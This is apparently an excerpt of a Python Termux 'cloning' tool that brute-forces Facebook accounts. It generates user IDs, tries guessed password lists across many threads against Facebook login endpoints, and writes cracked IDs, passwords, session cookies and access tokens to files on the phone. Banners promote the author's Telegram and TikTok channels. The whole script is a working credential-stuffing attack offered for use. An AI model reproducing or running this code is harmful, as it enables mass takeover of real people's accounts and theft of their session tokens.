...
\033[1;93m𝙉\033[1;94m𝙊\033[1;91m𝘽\033[1;92m??\033[1;95m??\033[1;90m𝘼\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
   ...
   \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
   ║  \x1b[97m\033[37;41m  ASKED YOU PAPA HWO I AM 𝐀𝐝𝐧𝐚𝐧_𝐊𝐢𝐧𝐠   \033[0;m   \33[1;92m    ║
   \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝        """)    
...
#os.system('https://www.facebook.com/profile.php?id=100006128411641')
name=fuckx.upper()

jalan('\x1b[1;31mADNAN KING CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :𝐀𝐝𝐧𝐚𝐧 = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :𝐀𝐝𝐧𝐚𝐧 = ' √ 2009'
        elif uid[:8] in ['10000000']        :𝐀𝐝𝐧𝐚𝐧 = ' √ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:𝐀𝐝𝐧𝐚𝐧 = ' √ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:𝐀𝐝𝐧𝐚𝐧 = ' 2010'
        elif uid[:6] in ['100001']          :𝐀𝐝𝐧𝐚𝐧 = ' √ 2010/2011'
        elif uid[:6] in ['100002','100003'] :𝐀𝐝𝐧𝐚𝐧 = ' √ 2011/2012'
        elif uid[:6] in ['100004']          :𝐀𝐝𝐧𝐚𝐧 = ' √ 2012/2013'
        elif uid[:6] in ['100005','100006'] :𝐀𝐝𝐧𝐚𝐧 = ' √ 2013/2014'
        elif uid[:6] in ['100007','100008'] :𝐀𝐝𝐧𝐚𝐧 = ' √ 2014/2015'
        elif uid[:6] in ['100009']          :𝐀𝐝𝐧𝐚𝐧 = ' √ 2015'
        elif uid[:5] in ['10001']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2015/2016'
        elif uid[:5] in ['10002']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2016/2017'
        elif uid[:5] in ['10003']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2018/2019'
        elif uid[:5] in ['10004']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2019/2020'
        elif uid[:5] in ['10005']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2020'
        elif uid[:5] in ['10006','10007','']:𝐀𝐝𝐧𝐚𝐧 = ' √ 2021'
        elif uid[:5] in ['10008']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2022'
        elif uid[:5] in ['10009']           :𝐀𝐝𝐧𝐚𝐧 = ' √ 2023'
        else:𝐀𝐝𝐧𝐚𝐧=''
...
\x1b[97m\033[37;41m OUR TELEGRAME CHANNEL TERMUX SCRIPT GIFT OK ALL JOIN   \033[0;m   \33[1;92m 
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} ADNAN_AHMED             {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}ADNAN AHMED            {N}{M}║
      {H}║{M}[{H}•{M}] GITHUB    : {H}ADNAN7878              {N}       {H}  ║
...
def main():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}ADNAN FIRE X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}𝐀𝐝𝐧𝐚𝐧 𝐀𝐡𝐦𝐞𝐝')
    print(f' ')
    ...
    if sh =='2':
       ...
       main()
    if sh =='3':
       os.system('https://www.tiktok.com/@adrishabinteayat?_t=8ia2Nfz7Y5I&_r=1/')
       main()
    else:
        os.system('xdg-open https://t.me/+PCHk9_nDCMM3NDI1')
        main()
...
def _xxx_():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}ADNAN-VILLAN-XD X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}𝐀𝐝𝐧𝐚𝐧 HASAN')
    print(f' ')
...
def _xnxx_():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}RANDOM_TOOLS')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}𝐀𝐝𝐧𝐚𝐧 ')
    print(f" ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/𝐀𝐝𝐧𝐚𝐧/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love),  (xbook), (pok), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (xbook),  (pok), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (xbook), (pok), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            if pom =='1':
...
def shind():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('57273200'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def shpak():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('𝐀𝐝𝐧𝐚𝐧'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}𝐀𝐝𝐧𝐚𝐧{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            𝐀𝐝𝐧𝐚𝐧 = random.choice(["\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧","\x1b[1;97m𝐀𝐝𝐧𝐚𝐧","\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧"])
            sys.stdout.write(f'\r    {P}[{𝐀𝐝𝐧𝐚𝐧}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[𝐀𝐝𝐧𝐚𝐧-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in 𝐀𝐝𝐧𝐚𝐧:
                  print(f'    {B}[COOKI🔥] {B}'+coki)
                open('/sdcard/𝐀𝐝𝐧𝐚𝐧-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
                ...
                if 'y' in 𝐀𝐝𝐧𝐚𝐧:
                  print(f'    {B}[COOKI🔥] {B}'+coki)
                open('/sdcard/𝐀𝐝𝐧𝐚𝐧-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[𝐀𝐝𝐧𝐚𝐧-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI🔥] {RED}'+coki)
                      open('/sdcard/𝐀𝐝𝐧𝐚𝐧-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92m𝐀𝐝𝐧𝐚𝐧\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧","\x1b[1;97m𝐀𝐝𝐧𝐚𝐧","\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧"])
            #sys.stdout.write(f'\r    {P}[{𝐀𝐝𝐧𝐚𝐧}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[𝐀𝐝𝐧𝐚𝐧-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI🔥] {B}'+coki)
                open('/sdcard/𝐀𝐝𝐧𝐚𝐧-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧","\x1b[1;97m𝐀𝐝𝐧𝐚𝐧","\x1b[1;91m𝐀𝐝𝐧𝐚𝐧","\x1b[1;92m𝐀𝐝𝐧𝐚𝐧","\x1b[1;93m𝐀𝐝𝐧𝐚𝐧","\x1b[1;94m𝐀𝐝𝐧𝐚𝐧","\x1b[1;95m𝐀𝐝𝐧𝐚𝐧","\x1b[1;96m𝐀𝐝𝐧𝐚𝐧"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[𝐀𝐝𝐧𝐚𝐧-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI🔥] {B}'+coki)
                open('/sdcard/𝐀𝐝𝐧𝐚𝐧-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[𝐀𝐝𝐧𝐚𝐧-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI🔥] {B}'+coki)
                open('/sdcard/𝐀𝐝𝐧𝐚𝐧-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
